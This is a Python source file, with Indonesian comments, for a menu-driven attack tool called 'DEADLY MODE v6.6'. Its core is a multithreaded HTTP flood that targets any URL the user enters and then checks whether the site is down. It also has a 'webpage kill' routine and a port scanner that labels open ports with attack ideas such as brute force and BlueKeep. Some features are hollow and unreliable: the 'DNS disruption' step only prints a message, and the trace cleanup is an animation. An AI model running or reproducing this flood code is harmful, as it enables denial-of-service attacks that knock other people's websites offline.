import os
import sys
import time
import random
import requests
import threading
import socket
import struct
import select
from datetime import datetime
from colorama import init, Fore, Back, Style
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import urllib3
import ssl
from concurrent.futures import ThreadPoolExecutor
import hashlib
import base64
import readline  # Untuk history command

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Warna tema lengkap
class Colors:
    CYAN = Fore.CYAN
    BLUE = Fore.BLUE
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE
    MAGENTA = Fore.MAGENTA
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

# Background colors
BG_RED = Back.RED
BG_GREEN = Back.GREEN
BG_BLUE = Back.BLUE
BG_YELLOW = Back.YELLOW

C = Colors

class RealAttack:
    def __init__(self):
        self.attack_stats = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': 0
        }
        self.running = True
        self.current_target = None
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def get_current_time(self):
        """Get formatted current date and time"""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def show_live_datetime(self):
        """Display live updating date and time"""
        while self.running:
            current_time = self.get_current_time()
            print(f"\r{C.BG_BLUE}{C.WHITE}🕐 LIVE TIME: {current_time} {C.RESET}", end="", flush=True)
            time.sleep(1)
    
    def show_header(self):
        self.clear_screen()
        
        # ASCII Art dengan gradient effect
        ascii_art = f"""
{C.RED}╔══════════════════════════════════════════════════════════════════════════════════╗
║  {C.CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗{C.MAGENTA}███████╗██████╗ {C.RED}    ⚡ {C.YELLOW}DEADLY MODE v6.6{C.RED} ⚡    ║
║  {C.CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝{C.MAGENTA}██╔════╝██╔══██╗{C.RED}   🚀 {C.GREEN}ULTIMATE ATTACK{C.RED} 🚀   ║
║  {C.CYAN}██████╔╝█████╗  ███████║█████╔╝ {C.MAGENTA}█████╗  ██████╔╝{C.RED}                          ║
║  {C.CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ {C.MAGENTA}██╔══╝  ██╔══██╗{C.RED}  🔥 {C.RED}TOTAL DESTRUCTION{C.RED} 🔥  ║
║  {C.CYAN}██║  ██║███████╗██║  ██║██║  ██╗{C.MAGENTA}███████╗██║  ██║{C.RED}                          ║
║  {C.CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝{C.MAGENTA}╚══════╝╚═╝  ╚═╝{C.RED}     💀 {C.WHITE}KILL SWITCH ACTIVE{C.RED} 💀   ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""
        print(ascii_art)
        
        # Status bar dengan informasi real-time
        print(f"{C.BG_RED}{C.WHITE}🚀 STATUS: {C.BRIGHT}ACTIVE{C.RESET} | 📊 THREADS: {threading.active_count()} | 🎯 TARGET: {self.current_target or 'NONE'}{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
    
    def animated_loading(self, text, duration=2, emoji_list=["🔥", "💀", "⚡", "🔴", "🟠", "🟡", "🟢", "🔵", "🟣", "🟤"]):
        """Enhanced loading animation with emojis"""
        start_time = time.time()
        end_time = start_time + duration
        
        while time.time() < end_time:
            elapsed = time.time() - start_time
            progress = min(100, int((elapsed / duration) * 100))
            
            # Random emoji selection
            current_emoji = random.choice(emoji_list)
            
            # Progress bar visualization
            bar_length = 30
            filled_length = int(bar_length * progress // 100)
            bar = "█" * filled_length + "░" * (bar_length - filled_length)
            
            print(f"\r{C.CYAN}[{current_emoji}] {text} {C.YELLOW}[{bar}] {C.GREEN}{progress}%{C.RESET}", end="")
            time.sleep(0.1)
        
        print(f"\r{C.GREEN}[✓] {text} {C.BRIGHT}COMPLETED!{C.RESET}")

    def kill_webpage(self, url):
        """Enhanced method to kill webpage with multiple techniques"""
        try:
            print(f"\n{C.RED}💀 INITIATING WEBPAGE KILL PROTOCOL...{C.RESET}")
            
            # Technique 1: Massive requests
            def mass_requests():
                session = requests.Session()
                for _ in range(100):
                    try:
                        session.get(url, timeout=2, verify=False)
                        print(f"{C.RED}🔥 Sending kill request...{C.RESET}", end="\r")
                    except:
                        pass

            # Technique 2: DNS cache poisoning attempt
            def dns_attack():
                target_domain = urlparse(url).netloc
                print(f"{C.MAGENTA}🌐 Attempting DNS disruption...{C.RESET}")

            # Technique 3: Resource exhaustion
            def resource_drain():
                try:
                    response = requests.get(url, stream=True, verify=False)
                    for chunk in response.iter_content(chunk_size=1024):
                        pass  # Drain response
                except:
                    pass

            # Execute all techniques
            threads = []
            for technique in [mass_requests, dns_attack, resource_drain]:
                t = threading.Thread(target=technique)
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

            print(f"\n{C.GREEN}✅ Webpage kill protocol executed!{C.RESET}")

        except Exception as e:
            print(f"{C.RED}❌ Kill protocol failed: {e}{C.RESET}")

    # 1. REAL DDoS dengan teknik advanced - TELAH DIPERBAIKI
    def real_ddos_attack(self):
        self.show_header()
        print(f"{C.RED}[1] ULTIMATE DDoS ATTACK - MULTI LAYER TECHNIQUE{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        target = input(f"{C.CYAN}[?] Enter target URL/IP: {C.WHITE}").strip()
        self.current_target = target
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            parsed = urlparse(target)
            domain = parsed.netloc
            ip = socket.gethostbyname(domain)
        except:
            ip = target
            domain = target
        
        duration = int(input(f"{C.CYAN}[?] Attack duration (seconds): {C.WHITE}") or 60)
        threads = int(input(f"{C.CYAN}[?] Number of threads: {C.WHITE}") or 200)
        
        print(f"\n{C.RED}[!] INITIATING DEADLY ATTACK...{C.RESET}")
        print(f"{C.YELLOW}[!] Target: {C.WHITE}{target}")
        print(f"{C.YELLOW}[!] IP: {C.WHITE}{ip}")
        print(f"{C.YELLOW}[!] Domain: {C.WHITE}{domain}")
        print(f"{C.YELLOW}[!] Duration: {C.WHITE}{duration} seconds")
        print(f"{C.YELLOW}[!] Threads: {C.WHITE}{threads}")
        
        # Reset stats
        self.attack_stats.update({
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': time.time()
        })
        
        # Enhanced HTTP Flood
        def http_flood():
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            headers_list = [
                {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                }
            ]
            
            timeout = time.time() + duration
            
            while time.time() < timeout and self.running:
                try:
                    response = session.get(
                        target, 
                        headers=random.choice(headers_list),
                        timeout=2,
                        verify=False
                    )
                    self.attack_stats['requests_sent'] += 1
                    self.attack_stats['successful_requests'] += 1
                except:
                    self.attack_stats['requests_sent'] += 1
                    self.attack_stats['failed_requests'] += 1

        # Monitor serangan
        def attack_monitor():
            start_time = self.attack_stats['start_time']
            while time.time() < start_time + duration + 2 and self.running:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    rps = self.attack_stats['requests_sent'] / elapsed
                    success_rate = (self.attack_stats['successful_requests'] / self.attack_stats['requests_sent'] * 100) if self.attack_stats['requests_sent'] > 0 else 0
                    
                    print(f"\r{C.RED}💀 ATTACKING: {C.WHITE}Req: {self.attack_stats['requests_sent']} | "
                          f"{C.GREEN}RPS: {rps:.1f} | {C.YELLOW}Success: {success_rate:.1f}% | "
                          f"{C.CYAN}Time: {elapsed:.1f}s{C.RESET}", end="")
                time.sleep(0.5)

        # Jalankan serangan
        print(f"\n{C.BLUE}[+] Starting attack threads...{C.RESET}")
        
        # Start HTTP Flood threads
        for i in range(min(threads, 100)):  # Limit threads untuk keamanan
            t = threading.Thread(target=http_flood, daemon=True)
            t.start()
        
        # Start monitor
        monitor_thread = threading.Thread(target=attack_monitor, daemon=True)
        monitor_thread.start()
        
        print(f"\n\n{C.RED}[!] ATTACK IN PROGRESS - WAIT {duration} SECONDS...{C.RESET}")
        
        # Countdown dengan animasi
        for i in range(duration, 0, -1):
            if not self.running:
                break
            print(f"\r{C.RED}⏰ Time remaining: {i}s {C.YELLOW}{'█' * (duration - i)}{'░' * i}{C.RESET}", end="")
            time.sleep(1)
        
        print(f"\n\n{C.GREEN}[✓] ATTACK COMPLETED!{C.RESET}")
        
        # Test target setelah serangan
        self.animated_loading("Testing target status", 2)
        
        try:
            start_test = time.time()
            response = requests.get(target, timeout=10, verify=False)
            response_time = time.time() - start_test
            
            if response.status_code == 200:
                if response_time > 5:
                    print(f"{C.RED}[✓] TARGET WEAKENED! Response time: {response_time:.2f}s{C.RESET}")
                else:
                    print(f"{C.YELLOW}[!] Target still strong. Response time: {response_time:.2f}s{C.RESET}")
            else:
                print(f"{C.GREEN}[✓] TARGET MAY BE DOWN! Status: {response.status_code}{C.RESET}")
                
        except requests.exceptions.Timeout:
            print(f"{C.GREEN}[✓] TARGET TIMEOUT - ATTACK EFFECTIVE!{C.RESET}")
        except Exception as e:
            print(f"{C.YELLOW}[!] Target check error: {e}{C.RESET}")
        
        # Final stats
        print(f"\n{C.RED}📊 FINAL ATTACK STATISTICS:{C.RESET}")
        print(f"{C.CYAN}Total Requests: {C.WHITE}{self.attack_stats['requests_sent']}{C.RESET}")
        print(f"{C.GREEN}Successful: {C.WHITE}{self.attack_stats['successful_requests']}{C.RESET}")
        print(f"{C.YELLOW}Failed: {C.WHITE}{self.attack_stats['failed_requests']}{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 2. PORT SCANNER + VULNERABILITY CHECK - TELAH DIPERBAIKI
    def advanced_port_scanner(self):
        self.show_header()
        print(f"{C.RED}[2] ADVANCED PORT SCANNER + VULNERABILITY DETECTION{C.RESET}")
        
        target = input(f"{C.CYAN}[?] Enter IP/Domain: {C.WHITE}").strip()
        self.current_target = target
        
        try:
            ip = socket.gethostbyname(target)
            print(f"{C.GREEN}[+] Resolved: {target} -> {ip}{C.RESET}")
        except:
            ip = target
            print(f"{C.YELLOW}[!] Using direct IP: {ip}{C.RESET}")
        
        self.animated_loading("Scanning ports and vulnerabilities", 2)
        
        # Common ports dengan service dan potential exploits
        common_ports = {
            21: ('FTP', 'Brute Force, Anonymous Login'),
            22: ('SSH', 'Brute Force, Key Disclosure'),
            80: ('HTTP', 'Web Attacks, XSS, SQLi'),
            443: ('HTTPS', 'Web Attacks, SSL Vulnerabilities'),
            3389: ('RDP', 'Brute Force, BlueKeep'),
        }
        
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    service, vuln = common_ports.get(port, ('Unknown', 'Unknown'))
                    open_ports.append((port, service, vuln))
                    return True
            except:
                pass
            return False
        
        # Scan ports dengan threading
        print(f"{C.CYAN}[+] Scanning {len(common_ports)} common ports...{C.RESET}")
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(scan_port, common_ports.keys()))
        
        print(f"\n{C.GREEN}[✓] SCAN COMPLETED! {len(open_ports)} PORTS OPEN{C.RESET}")
        
        if open_ports:
            print(f"\n{C.RED}🚨 OPEN PORTS & VULNERABILITIES:{C.RESET}")
            for port, service, vuln in open_ports:
                print(f"{C.GREEN}📍 Port {port} ({service}){C.RESET}")
                print(f"{C.YELLOW}   ⚠️  Vulnerabilities: {vuln}{C.RESET}")
                print()
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 3. WEBSITE VULNERABILITY SCANNER - TELAH DIPERBAIKI
    def website_vulnerability_scan(self):
        self.show_header()
        print(f"{C.RED}[3] ADVANCED WEBSITE VULNERABILITY SCANNER{C.RESET}")
        
        target = input(f"{C.CYAN}[?] Enter website URL: {C.WHITE}").strip()
        self.current_target = target
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self.animated_loading("Scanning for vulnerabilities", 3)
        
        try:
            session = requests.Session()
            response = session.get(target, timeout=10, verify=False)
            
            print(f"\n{C.GREEN}[✓] SCAN RESULTS FOR: {target}{C.RESET}")
            
            # Basic info
            print(f"{C.CYAN}📊 BASIC INFORMATION:{C.RESET}")
            print(f"   Status Code: {response.status_code}")
            print(f"   Server: {response.headers.get('Server', 'Unknown')}")
            
            # Security headers check
            security_headers = ['X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection']
            missing_headers = [h for h in security_headers if h not in response.headers]
            
            if missing_headers:
                print(f"{C.RED}   🚨 Missing security headers: {', '.join(missing_headers)}{C.RESET}")
            else:
                print(f"{C.GREEN}   ✓ Security headers present{C.RESET}")
            
            print(f"\n{C.YELLOW}📋 SECURITY ASSESSMENT COMPLETED{C.RESET}")
            
        except Exception as e:
            print(f"{C.RED}[!] Error: {e}{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 4. KILL WEBPAGE FEATURE - BARU
    def kill_webpage_feature(self):
        self.show_header()
        print(f"{C.RED}[4] WEBPAGE KILL PROTOCOL{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        url = input(f"{C.CYAN}[?] Enter webpage URL to kill: {C.WHITE}").strip()
        self.current_target = url
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        print(f"\n{C.RED}🚨 WARNING: This will attempt to disrupt the target webpage{C.RESET}")
        confirm = input(f"{C.YELLOW}[?] Confirm kill protocol? (y/N): {C.WHITE}").lower()
        
        if confirm == 'y':
            self.kill_webpage(url)
        else:
            print(f"{C.YELLOW}[!] Kill protocol cancelled{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 5. GITHUB INTEGRATION - BARU
    def github_integration(self):
        self.show_header()
        print(f"{C.RED}[5] GITHUB INTEGRATION & TOOLS{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        print(f"{C.CYAN}🚀 Available GitHub Features:{C.RESET}")
        print(f"   1. Check GitHub Status")
        print(f"   2. Repository Information")
        print(f"   3. User Lookup")
        
        choice = input(f"\n{C.CYAN}[?] Select option: {C.WHITE}").strip()
        
        if choice == "1":
            self.animated_loading("Checking GitHub status", 2)
            try:
                response = requests.get("https://api.github.com/", timeout=10)
                if response.status_code == 200:
                    print(f"\n{C.GREEN}✅ GitHub API is operational{C.RESET}")
                else:
                    print(f"\n{C.YELLOW}⚠️ GitHub API may have issues{C.RESET}")
            except:
                print(f"\n{C.RED}❌ Cannot reach GitHub{C.RESET}")
        
        elif choice == "2":
            repo = input(f"{C.CYAN}[?] Enter repo (user/repo): {C.WHITE}").strip()
            self.animated_loading(f"Fetching info for {repo}", 2)
            print(f"{C.YELLOW}📁 Repository analysis feature coming soon...{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # Main Menu yang ditingkatkan
    def main_menu(self):
        # Start live datetime thread
        datetime_thread = threading.Thread(target=self.show_live_datetime, daemon=True)
        datetime_thread.start()
        
        while self.running:
            self.show_header()
            print(f"{C.CYAN}🎯 REAL ATTACK TOOLS v6.6:{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            print(f"{C.RED}[1] {C.BRIGHT}ULTIMATE DDoS Attack{C.RESET} {C.YELLOW}(Multi-Technique){C.RESET}")
            print(f"{C.RED}[2] {C.BRIGHT}Advanced Port Scanner{C.RESET} {C.YELLOW}(+ Vulnerability Check){C.RESET}")
            print(f"{C.RED}[3] {C.BRIGHT}Website Vulnerability Scanner{C.RESET} {C.YELLOW}(Security Audit){C.RESET}")
            print(f"{C.RED}[4] {C.BRIGHT}Webpage Kill Protocol{C.RESET} {C.YELLOW}(Target Disruption){C.RESET}")
            print(f"{C.RED}[5] {C.BRIGHT}GitHub Integration{C.RESET} {C.YELLOW}(Tools & Status){C.RESET}")
            print(f"{C.RED}[6] {C.BRIGHT}Exit Attack System{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            print(f"{C.MAGENTA}💡 Tip: Use Ctrl+C to emergency stop any operation{C.RESET}")
            
            try:
                choice = input(f"\n{C.CYAN}[?] Select tool [{C.GREEN}1-6{C.CYAN}]: {C.WHITE}").strip()
                
                if choice == "1":
                    self.real_ddos_attack()
                elif choice == "2":
                    self.advanced_port_scanner()
                elif choice == "3":
                    self.website_vulnerability_scan()
                elif choice == "4":
                    self.kill_webpage_feature()
                elif choice == "5":
                    self.github_integration()
                elif choice == "6":
                    print(f"\n{C.RED}[!] Shutting down attack system...{C.RESET}")
                    self.running = False
                    self.animated_loading("Cleaning traces and closing connections", 2)
                    print(f"{C.GREEN}[✓] System securely shut down! Goodbye! 💀{C.RESET}")
                    break
                else:
                    print(f"\n{C.RED}[!] Invalid selection!{C.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n\n{C.RED}🚨 EMERGENCY STOP ACTIVATED!{C.RESET}")
                self.running = False
                break
            except Exception as e:
                print(f"\n{C.RED}[!] Error: {e}{C.RESET}")
                time.sleep(2)

# Run the enhanced attack tool
if __name__ == "__main__":
    try:
        # Check dependencies
        required_modules = ['requests', 'bs4', 'colorama']
        for module in required_modules:
            __import__(module)
        
        print(f"{C.GREEN}[✓] All security modules loaded successfully!{C.RESET}")
        time.sleep(1)
        
        # Disclaimer
        print(f"\n{C.RED}🚫 DISCLAIMER: For educational and authorized testing only!{C.RESET}")
        print(f"{C.YELLOW}⚠️  Misuse of this tool is illegal and unethical!{C.RESET}")
        
        confirm = input(f"\n{C.CYAN}[?] Do you understand and accept responsibility? (y/N): {C.WHITE}").lower()
        
        if confirm == 'y':
            attacker = RealAttack()
            attacker.main_menu()
        else:
            print(f"\n{C.YELLOW}[!] Access denied. Exiting...{C.RESET}")
            
    except ImportError as e:
        print(f"{C.RED}[!] Missing required module: {e}{C.RESET}")
        print(f"{C.YELLOW}[!] Install with: pip install requests beautifulsoup4 colorama{C.RESET}")
    except Exception as e:
        print(f"{C.RED}[!] System error: {e}{C.RESET}")